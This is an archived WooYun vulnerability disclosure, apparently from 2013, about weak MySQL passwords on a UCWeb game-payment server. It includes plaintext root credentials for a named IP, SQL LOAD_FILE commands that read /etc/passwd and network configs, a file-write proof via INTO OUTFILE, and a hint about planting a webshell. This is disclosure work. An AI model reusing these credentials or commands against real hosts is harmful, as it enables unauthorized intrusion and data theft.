@@ -1,0 +1,365 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		自动化枚举系列#1 UC某服务弱口令导致可内网渗透  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		自动化枚举系列#1 UC某服务弱口令导致可内网渗透  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/猪猪侠">猪猪侠</a> 
+</li><li>提交时间：		2013-11-05 23:08</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-05：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-10：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">由于各种业务系统自身的业务特性，会开放许多接口便于数据处理，如果接口或功能未进行严谨的安全控制或判断，将会促进骇客加快攻击业务系统的过程，大大降低了骇客发现威胁的人力成本。<br />
+<br />
+随着模块化的自动化攻击工具包越来越趋向完善，将给业务或数据带来最大的威胁。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">#1 漏洞描述<br />
+<br />
+<br />
+<br />
+IP: 121.14.161.196 端口：3306 存在mysql弱口令<br />
+<br />
+用户：root 密码：root<br />
+<br />
+用户：pay  密码：paypw<br />
+<br />
+<br />
+<br />
+服务器同时对外开放了WEB服务<br />
+<br />
+http://pay.uctest2.ucweb.com:8039/role.jsp<br />
+<br />
+<br />
+<br />
+利用MYSQL的into outfile功能，或许可以写入一个SHELL？<br />
+<br />
+<br />
+<br />
+</p><pre><code>/*Server Information For - root@121.14.161.196*/ <br />
+-------------------------------------------------<br />
+<br />
+MySQL Version                 : 5.1.54-log<br />
+Host                          : 121.14.161.196<br />
+User                          : root<br />
+Port                          : 3306<br />
+Server Default Charset        : utf8<br />
+<br />
+/*SHOW VARIABLES Output*/<br />
+---------------------------<br />
+<br />
+Variable_name                            Value                                                                                      <br />
+---------------------------  -------------------------------<br />
+auto_increment_increment                 1                                                                                          <br />
+auto_increment_offset                    1                                                                                          <br />
+autocommit                               ON                                                                                         <br />
+automatic_sp_privileges                  ON                                                                                         <br />
+back_log                                 600                                                                                        <br />
+basedir                                  /home/mysql/mysql/                                                                         <br />
+big_tables                               OFF                                                                                        <br />
+binlog_cache_size                        1048576                                                                                    <br />
+binlog_direct_non_transactional_updates  OFF                                                                                        <br />
+binlog_format                            MIXED                                                                                      <br />
+bulk_insert_buffer_size                  67108864                                                                                   <br />
+character_set_client                     utf8                                                                                       <br />
+character_set_connection                 utf8                                                                                       <br />
+character_set_database                   utf8                                                                                       <br />
+character_set_filesystem                 binary                                                                                     <br />
+character_set_results                    utf8                                                                                       <br />
+character_set_server                     utf8                                                                                       <br />
+character_set_system                     utf8                                                                                       <br />
+character_sets_dir                       /home/mysql/mysql/share/mysql/charsets/                                                    <br />
+collation_connection                     utf8_general_ci                                                                            <br />
+collation_database                       utf8_general_ci                                                                            <br />
+collation_server                         utf8_general_ci                                                                            <br />
+completion_type                          0                                                                                          <br />
+concurrent_insert                        1                                                                                          <br />
+connect_timeout                          10                                                                                         <br />
+datadir                                  /home/mysql/data/                                                                          <br />
+date_format                              %Y-%m-%d                                                                                   <br />
+datetime_format                          %Y-%m-%d %H:%i:%s                                                                          <br />
+default_week_format                      0                                                                                          <br />
+delay_key_write                          ON                                                                                         <br />
+delayed_insert_limit                     100                                                                                        <br />
+delayed_insert_timeout                   300                                                                                        <br />
+delayed_queue_size                       1000                                                                                       <br />
+div_precision_increment                  4                                                                                          <br />
+engine_condition_pushdown                ON                                                                                         <br />
+error_count                              0                                                                                          <br />
+event_scheduler                          OFF                                                                                        <br />
+expire_logs_days                         8                                                                                          <br />
+flush                                    OFF                                                                                        <br />
+flush_time                               0                                                                                          <br />
+foreign_key_checks                       ON                                                                                         <br />
+ft_boolean_syntax                        + -&gt;&lt;()~*:&quot;&quot;&amp;|                                                                             <br />
+ft_max_word_len                          84                                                                                         <br />
+ft_min_word_len                          4                                                                                          <br />
+ft_query_expansion_limit                 20                                                                                         <br />
+ft_stopword_file                         (built-in)                                                                                 <br />
+general_log                              OFF                                                                                        <br />
+general_log_file                         /home/mysql/log/general.log                                                                                                                                                    <br />
+hostname                                 jiuyou211</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+#2 承载业务<br />
+<br />
+初步校验了下数据内容，发现和UC的游戏业务有关，内含多个订单、用户信息表<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/05230316cc9b0bfcab0f91178b162b7ac13597c4.jpg" target="_blank"><img src="../images/05230316cc9b0bfcab0f91178b162b7ac13597c4.jpg" alt="uc_mysql_upp.jpg" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">#3 读文件<br />
+<br />
+<br />
+<br />
+</p><pre><code>root:x:0:0:root:/root:/bin/bash<br />
+bin:x:1:1:bin:/bin:/sbin/nologin<br />
+daemon:x:2:2:daemon:/sbin:/sbin/nologin<br />
+adm:x:3:4:adm:/var/adm:/sbin/nologin<br />
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin<br />
+sync:x:5:0:sync:/sbin:/bin/sync<br />
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown<br />
+halt:x:7:0:halt:/sbin:/sbin/halt<br />
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin<br />
+news:x:9:13:news:/etc/news:<br />
+uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin<br />
+operator:x:11:0:operator:/root:/sbin/nologin<br />
+games:x:12:100:games:/usr/games:/sbin/nologin<br />
+gopher:x:13:30:gopher:/var/gopher:/sbin/nologin<br />
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin<br />
+nobody:x:99:99:Nobody:/:/sbin/nologin<br />
+vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin<br />
+nscd:x:28:28:NSCD Daemon:/:/sbin/nologin<br />
+pcap:x:77:77::/var/arpwatch:/sbin/nologin<br />
+rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin<br />
+mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin<br />
+smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin<br />
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin<br />
+dbus:x:81:81:System message bus:/:/sbin/nologin<br />
+avahi:x:70:70:Avahi daemon:/:/sbin/nologin<br />
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin<br />
+nfsnobody:x:4294967294:4294967294:Anonymous NFS User:/var/lib/nfs:/sbin/nologin<br />
+haldaemon:x:68:68:HAL daemon:/:/sbin/nologin<br />
+avahi-autoipd:x:100:101:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologin<br />
+distcache:x:94:94:Distcache:/:/sbin/nologin<br />
+apache:x:48:48:Apache:/var/www:/sbin/nologin<br />
+webalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin<br />
+squid:x:23:23::/var/spool/squid:/sbin/nologin<br />
+ntp:x:38:38::/etc/ntp:/sbin/nologin<br />
+xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin<br />
+gdm:x:42:42::/var/gdm:/sbin/nologin<br />
+oprofile:x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologin<br />
+nemo:x:500:500::/home/nemo:/bin/bash<br />
+nagios:x:501:501::/home/nagios:/bin/bash<br />
+suhz:x:502:502::/home/suhz:/bin/bash<br />
+lijian:x:503:503::/home/lijian:/bin/bash<br />
+together:x:504:504::/home/together:/bin/bash<br />
+gaozq:x:505:505::/home/gaozq:/bin/bash<br />
+zhongmj:x:506:506::/home/zhongmj:/bin/bash<br />
+paycenter:x:507:507::/home/paycenter:/bin/bash<br />
+upay:x:508:508::/home/upay:/bin/bash<br />
+gamepay:x:509:509::/home/gamepay:/bin/bash<br />
+TestEmu:x:510:510::/home/TestEmu:/bin/bash<br />
+mysql:x:511:511::/home/mysql:/bin/bash<br />
+oracle:x:514:515:Oracle software owner:/home/oracle:/bin/bash<br />
+zhuangqi:x:515:516::/home/zhuangqi:/bin/bash<br />
+lixl:x:516:517::/home/lixl:/bin/bash<br />
+play:x:517:518::/home/play:/bin/bash<br />
+payint:x:518:519::/home/payint:/bin/bash</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><pre><code># Do not remove the following line, or various programs<br />
+# that require network functionality will fail.<br />
+127.0.0.1		localhost.localdomain localhost<br />
+::1		localhost6.localdomain6 localhost6<br />
+10.20.102.143   jiuyou211<br />
+192.168.3.105   hg.ucweb.local</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+SELECT LOAD_FILE(&#039;/etc/sysconfig/network-scripts/ifcfg-eth0&#039;)<br />
+<br />
+<br />
+<br />
+</p><pre><code># Intel Corporation 82574L Gigabit Network Connection<br />
+DEVICE=eth0<br />
+HWADDR=00:25:90:01:AD:18<br />
+ONBOOT=yes<br />
+IPADDR=121.14.161.196<br />
+NETMASK=255.255.255.128<br />
+GATEWAY=121.14.161.129</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+SELECT LOAD_FILE(&#039;/etc/sysconfig/network-scripts/ifcfg-eth1&#039;)<br />
+<br />
+<br />
+<br />
+</p><pre><code># Intel Corporation 82574L Gigabit Network Connection<br />
+DEVICE=eth1<br />
+HWADDR=00:25:90:01:AD:19<br />
+ONBOOT=yes<br />
+IPADDR=10.20.102.143<br />
+NETMASK=255.255.255.0</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+# 成功写入文件<br />
+<br />
+SELECT &#039;wooyun&#039; INTO OUTFILE &#039;/tmp/hello.txt&#039;<br />
+<br />
+<br />
+<br />
+SELECT LOAD_FILE(&#039;/tmp/hello.txt&#039;)<br />
+<br />
+wooyun </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">#1 网络边界需要认真对待。<br />
+<br />
+#2 安全是一个整体，保证安全不在于强大的地方有多强大，而在于真正薄弱的地方在哪里。<br />
+<br />
+#3 杜绝为了方便而造成的不必要的信息泄露和弱口令。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/猪猪侠" title="猪猪侠">猪猪侠</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-042097" title="自动化枚举系列#1 UC某服务弱口令导致可内网渗透">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-11-05 23:08</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+													<p class="detail">漏洞Rank：5 (WooYun评价)</p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2013-11-11：@猪猪侠，抱歉，事情太多忘记了三天不回复就视为忽略了，之前你发的漏洞消息我们是按最高级别20给的，忘见谅。</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="42097";
+var bugRating="-3";
+var myRating="";
+var ratingCount="2";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
